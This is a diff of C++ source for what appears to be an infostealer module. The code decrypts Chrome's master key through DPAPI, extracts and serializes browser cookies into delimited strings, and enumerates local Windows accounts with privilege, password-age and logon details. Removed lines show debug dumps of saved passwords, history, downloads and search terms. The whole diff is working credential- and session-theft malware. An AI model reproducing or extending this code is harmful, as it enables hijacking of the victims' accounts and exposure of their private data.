@@ -1,88 +1,11 @@
 #include "mod_info.hpp"
 #include "misc.hpp"
 
-void mod_Info::test_Data() {
-	std::cout << "CHROME PROFILES DUMP_TEST:\n";
+void mod_Info::testData() {
 	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
-		/////////////////////////////////////////////////////
-		//                     PASSWORDS
-		/////////////////////////////////////////////////////
-		/*for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
-			std::cout << "URL: " << data.strUrl << "\n";
-			std::cout << "Action: " << data.strAction << "\n";
-			std::cout << "User: " << data.strUser << "\n";
-			std::cout << "Pass: " << data.strPassword << "\n";
-		}*/
-		/////////////////////////////////////////////////////
-		/////////////////////////////////////////////////////
-
-
-		/////////////////////////////////////////////////////
-		//                     COOKIES
-		/////////////////////////////////////////////////////
-		/*std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
-		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath)) {
-			if (nCookie.strValue != "" && nCookie.strValue != "V20 Cookie :v" && nCookie.strValue != "ENCRYPTED_ERR") {
-				std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
-				std::cout << "host_key: " << nCookie.strHostKey << "\n";
-				std::cout << "name: " << nCookie.strName << "\n";
-				std::cout << "value: " << nCookie.strValue << "\n";
-				std::cout << "path: " << nCookie.strPath << "\n";
-				std::cout << "expires_utc: " << nCookie.strExpiresUTC << "\n";
-				std::cout << "last_access_utc: " << nCookie.strLastAccessUTC << "\n";
-				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";
-			}
+		for (Cookie ck : this->m_ProfileCookies(profile.strPath)) {
+			std::cout << ck.strName << "\n";
 		}
-		std::cout << "\n==================================\n";*/
-		/////////////////////////////////////////////////////
-		/////////////////////////////////////////////////////
-
-
-		/////////////////////////////////////////////////////
-		//                     HISTORY
-		/////////////////////////////////////////////////////
-		/*std::cout << "HISTORY FOR " << profile.strName << "\n==================================\n";
-		for (Chrome_History& nHistory : this->m_ProfileBrowsingHistory(profile.strPath)) {
-			std::cout << "URL: " << nHistory.strURL << "\n";
-			std::cout << "TITLE: " << nHistory.strTitle << "\n";
-			std::cout << "VISIT_COUNT: " << nHistory.strVisitCount << "\n";
-			std::cout << "LAST_TIME: " << nHistory.strLastVisitTime << "\n";
-		}
-		std::cout << "\n==================================\n"; */
-		/////////////////////////////////////////////////////
-		/////////////////////////////////////////////////////
-
-
-		/////////////////////////////////////////////////////
-		//              DOWNLOAD  HISTORY
-		/////////////////////////////////////////////////////
-		/*std::cout << "DOWNLOAD HISTORY FOR " << profile.strName << "\n==================================\n";
-		for (Chrome_Download_History& nDownload : this->m_ProfileDownloadHistory(profile.strPath)) {
-			std::cout << "PATH: " << nDownload.strTargetPath << "\n";
-			std::cout << "START: " << nDownload.strStartTime << "\n";
-			std::cout << "BYTES: " << nDownload.strTotalBytes << "\n";
-			std::cout << "URL: " << nDownload.strTabURL << "\n";
-			std::cout << "MIME: " << nDownload.strMimeType << "\n";
-		}
-		std::cout << "\n==================================\n";*/
-		/////////////////////////////////////////////////////
-		/////////////////////////////////////////////////////
-
-
-
-		/*std::cout << "SEARCH TERMS FOR " << profile.strName << "\n==================================\n";
-		for (Chrome_Search_Terms& nTerm : this->m_ProfileSearchTerms(profile.strPath)) {
-			std::cout << "TERM: " << nTerm.strTerm << "\n";
-		}
-		std::cout<< "\n==================================\n";*/
-		//	std::cout << "\nPATH: " << profile.strPath << "\n";
-		//	std::string Login_Path = profile.strPath + "Login Data";
-		//	std::cout << "\nNAME: " << profile.strName << "\n";
-		//	std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
-		//	std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
-		//	std::cout << "USERNAME: " << profile.strUserName << "\n";
-		//	std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
-			
 	}
 }
 
@@ -282,21 +205,14 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			//##################################################################################
 			std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
 			
-			//v20 cookies :v
-			//std::string strBoundKey = base64_decode(jeyson["os_crypt"]["app_bound_encrypted_key"]);
-			
 			strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
-			//strBoundKey = strBoundKey.substr(4, strBoundKey.size() - 4);
-
+			
 			strMasterKey = this->m_DecryptMasterKey(strMasterKey);
-			//strBoundKey = this->m_DecryptMasterKey(strBoundKey);
-
+			
 			this->vcChromeKey.resize(strMasterKey.size());
-			//this->vcBoundKey.resize(strBoundKey.size());
-
+			
 			memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
-			//memcpy(this->vcBoundKey.data(), strBoundKey.data(), strBoundKey.size());
-
+			
 			DATA_BLOB MasterKey;
 			MasterKey.cbData = this->vcChromeKey.size();
 			MasterKey.pbData = this->vcChromeKey.data();
@@ -307,18 +223,6 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			}else {
 				this->isBcrptOK = true;
 			}
-
-			/*MasterKey.cbData = this->vcBoundKey.size();
-			MasterKey.pbData = this->vcBoundKey.data();
-
-			nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey2, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
-			if (!BCRYPT_SUCCESS(nStatus)) {
-				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
-				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
-			}
-			else {
-				this->isBcrptOK = true;
-			}*/
 			//##################################################################################
 			//##################################################################################
 		}
@@ -383,7 +287,7 @@ std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath) {
 					nCookie.strExpiresUTC    = item[5];
 					nCookie.strLastAccessUTC = item[6];
 					nCookie.strLastUpdateUTC = item[7];
-
+				
 					vcOut.push_back(nCookie);
 				}
 			}
@@ -519,22 +423,24 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 		case '5':
 			//Cookies
 			for (Cookie& cookie_data : this->m_ProfileCookies(strPath)) {
-				strOut += cookie_data.strCreationUTC;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strHostKey;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strName;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strValue;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strPath;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strExpiresUTC;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strLastAccessUTC;
-				strOut += CMD_DEL_2;
-				strOut += cookie_data.strLastUpdateUTC;
-				strOut += ":[<>]:";
+				if (cookie_data.strValue != "V20 Cookie :v" && cookie_data.strValue != "ENCRYPTED_ERR") {
+					strOut += cookie_data.strCreationUTC;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strHostKey;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strName;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strValue;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strPath;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strExpiresUTC;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strLastAccessUTC;
+					strOut += CMD_DEL_2;
+					strOut += cookie_data.strLastUpdateUTC;
+					strOut += ":[<>]:";
+				}
 			}
 			break;
 		default:
@@ -548,8 +454,41 @@ std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cO
 	return strOut;
 }
 
-std::vector<std::string> mod_Info::m_Usuarios() {
-	std::vector<std::string> vcOut;
+std::string mod_Info::m_GetUsersData() {
+	std::string strOut = "";
+	for (User_Info usuario : this->m_Usuarios()) {
+		strOut += usuario.strUserName;
+		strOut += CMD_DEL_2;
+		strOut += usuario.strComment;
+		strOut += CMD_DEL_2;
+		strOut += usuario.strFullName;
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwPasswordAge);
+		strOut += CMD_DEL_2;
+		strOut += usuario.strHomeDir;
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwLastLogon);
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwLastLogOff);
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwBadPwCount);
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwNumLogons);
+		strOut += CMD_DEL_2;
+		strOut += usuario.strLogonServer;
+		strOut += CMD_DEL_2;
+		strOut += std::to_string(usuario.dwCountryCode);
+		strOut += ":[<>]:";
+	}
+
+	if (strOut.size() > 6) {
+		strOut = strOut.substr(0, strOut.size() - 6);
+	}
+	return strOut;
+}
+
+std::vector<User_Info> mod_Info::m_Usuarios() {
+	std::vector<User_Info> vcOut;
 	LPUSER_INFO_11 lUsers = nullptr;
 	LPUSER_INFO_11 lTmpuser = nullptr;
 	DWORD dCount = 0, dHints = 0;
@@ -563,13 +502,31 @@ std::vector<std::string> mod_Info::m_Usuarios() {
 						__DBG_("lUsers = NULL")
 						break;
 					}
-					std::wstring st = lTmpuser->usri11_name;
-					std::string strTempUser(st.begin(), st.end());
+					std::string strTempUser = this->toString(lTmpuser->usri11_name);
 					if (strTempUser != "") {
+						User_Info new_User;
+						new_User.strComment = this->toString(lTmpuser->usri11_comment);
+						new_User.strFullName = this->toString(lTmpuser->usri11_full_name);
+						new_User.dwPasswordAge = lTmpuser->usri11_password_age;
+						new_User.strHomeDir = this->toString(lTmpuser->usri11_home_dir);
+						new_User.dwLastLogon = lTmpuser->usri11_last_logon;
+						new_User.dwLastLogOff = lTmpuser->usri11_last_logoff;
+						new_User.dwBadPwCount = lTmpuser->usri11_bad_pw_count;
+						new_User.dwNumLogons = lTmpuser->usri11_num_logons;
+						new_User.strLogonServer = this->toString(lTmpuser->usri11_logon_server);
+						new_User.dwCountryCode = lTmpuser->usri11_country_code;
+						
 						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
 							strTempUser += " (ADMIN)";
+						}else if (lTmpuser->usri11_priv == USER_PRIV_USER) {
+							strTempUser += " (USER)";
+						}else {
+							strTempUser += " (GUEST)";
 						}
-						vcOut.push_back(strTempUser);
+
+						new_User.strUserName = strTempUser;
+
+						vcOut.push_back(new_User);
 					}
 					lTmpuser++;
 				}
